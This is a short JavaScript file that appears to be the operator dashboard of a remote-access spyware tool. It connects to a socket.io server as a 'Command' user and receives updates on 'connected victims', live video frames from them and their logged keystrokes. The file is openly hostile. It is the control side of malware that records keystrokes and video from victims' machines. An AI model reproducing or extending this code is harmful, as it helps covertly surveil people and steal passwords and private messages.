var socket = io("/?userType=Command");
socket.on('connect', () => {
    console.log("Default namespace ID: ", socket.id)
    console.log(`Socket connected - ${socket.connected}`);
});

socket.on('disconnect', () => {
    console.log(`Socket disconnected - ${!socket.connected}`);
});

socket.on("Update connected victims", async victims => {
    await updateConnectedVictims(victims);
});

socket.on("video_stream", async data => {
    await updateVideoFrame(data.frame);
});

socket.on("victim_keystrokes", async data => {
    console.log(data);
    await updateKeystrokes(data);
})